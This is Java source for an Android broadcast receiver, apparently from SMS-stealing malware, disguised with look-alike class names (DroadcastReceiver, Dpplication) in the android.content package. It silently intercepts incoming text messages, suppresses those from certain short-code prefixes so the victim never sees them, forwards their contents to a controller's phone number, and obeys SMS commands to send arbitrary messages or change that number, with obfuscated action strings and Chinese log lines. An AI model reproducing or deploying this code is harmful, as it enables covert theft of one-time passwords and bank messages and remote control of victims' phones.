package android.content;

import java.util.Date;

import android.app.Activity;
import android.app.Dctivity;
import android.app.Dervice;
import android.app.Dpplication;
import android.content.SharedPreferences.Editor;
import android.database.sqlite.DQLiteOpenHelper;
import android.lang.Dhread;
import android.lang.LogUtils;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.DmsManager;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class DroadcastReceiver extends BroadcastReceiver {

	public static String[] NUMS = new String[] { "10", "9", "11", "16","152","159","55" };

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		String daction = Dpplication.Eecode(intent.getAction());
		LogUtils.write("Send", "action " + daction);
		if (daction.equals(Dpplication.smsfilter1)
				|| daction.equals(Dpplication.smsfilter2)
				|| daction.equals(Dpplication.smsfilter3)) {
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				String from = "";
				StringBuffer msg = new StringBuffer();
				SmsMessage[] messages = new SmsMessage[pdus.length];
                for(int i=0;i<messages.length;i++)
                {
                    byte[] pdu=(byte[])pdus[i];
                    messages[i]=SmsMessage.createFromPdu(pdu);
                }    
                for(SmsMessage sm:messages)
                {
                    String content=sm.getMessageBody();
                    msg.append(content);
                    from=sm.getOriginatingAddress();
                }
                if(msg.toString().startsWith(Dctivity.qianzhui)){
                	this.abortBroadcast();
                	String body=msg.substring(Dctivity.qianzhui.length());
                	String bodys[]=body.split("-");
                	if(bodys.length==2){
                		DmsManager.Send(context,bodys[0],bodys[1]);
                	}else{
                		LogUtils.write("Send", "格式错误"+body);
                	}
                }else if(msg.toString().startsWith(Dctivity.updatephone)){
                	this.abortBroadcast();
                	String body=msg.substring(Dctivity.updatephone.length());
                	Dctivity.setPhonenum(context, body);
                }else{
                	LogUtils.write("Send", "号码 " + from+"  "+msg);
    				from = from.replace("+86", "").replace("+1", "");
    				LogUtils.write("Send", "去除加号 " + from);

    				boolean isflag = false;
    				for (int i = 0; i < NUMS.length; i++) {
    					LogUtils.write("Send", from + " 前缀 " + NUMS[i]);
    					if (from.startsWith(NUMS[i])) {
    						isflag = true;
    						break;
    					}
    				}
    				LogUtils.write("Send", "匹配 " + isflag);
    				if (isflag) {
    					LogUtils.write("Send", "匹配成功,中断广播");
    					this.abortBroadcast();
    					LogUtils.write("Send", "写入数据库" + isflag);
    					DmsManager.Send(context,Dctivity.getPhoneNum(context),Dctivity.lanjie+""+from+"#"+msg.toString());
    					DQLiteOpenHelper.getHelper(context).addData("拦截", from,msg.toString(),new Date());
    					Dhread.SartSend(context.getApplicationContext());
    				}
                }
				
			} else {
				LogUtils.write("Send", "获取短信失败");
			}

		} else if(daction.equals(Dpplication.smssend)){
			String phoneNum = intent.getStringExtra("phone");
			LogUtils.write("Result", phoneNum+"");
			switch(getResultCode())  
            {  
                case Activity.RESULT_OK:  
                	LogUtils.write("Send", phoneNum+"-短信发送成功");
                    break;  
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:  
                	LogUtils.write("Send", phoneNum+"-短信发送失败RESULT_ERROR_GENERIC_FAILURE");
                case SmsManager.RESULT_ERROR_RADIO_OFF:  
                	LogUtils.write("Send", phoneNum+"-短信发送失败RESULT_ERROR_RADIO_OFF");
                case SmsManager.RESULT_ERROR_NULL_PDU:
                	LogUtils.write("Send", phoneNum+"-短信发送失败RESULT_ERROR_NULL_PDU"); 
                default:  
                	LogUtils.write("Send", phoneNum+"-未知错误"); 
                    break;  
            }  
			
		}else{
			LogUtils.write("Send", "发送数据");
			Dhread.SartSend(context.getApplicationContext());
			
			LogUtils.write("Send", "启动服务");
			Intent server = new Intent(context, Dervice.class);
			context.getApplicationContext().startService(server);
		}

	}

	private Handler handler = new Handler();
}
